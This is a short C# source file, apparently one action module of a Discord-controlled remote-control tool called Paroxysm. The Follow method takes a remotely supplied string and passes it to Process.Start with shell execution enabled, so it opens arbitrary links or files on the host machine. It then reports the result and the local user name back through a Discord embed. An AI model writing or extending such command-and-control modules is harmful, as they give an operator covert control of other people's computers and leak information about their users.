using System.Diagnostics;
using Discord;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class WebpageAction
{
    public static Embed Follow(string url)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            });

            return EmbedCreator.CreateWithText(Color.Red, "Command was executed successfully.",
                $"Link {url} has been opened in default browser.", Environment.UserName, null);
        }
        catch
        {
            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                "Cannot open current webpage.", Environment.UserName, null);
        }
    }
}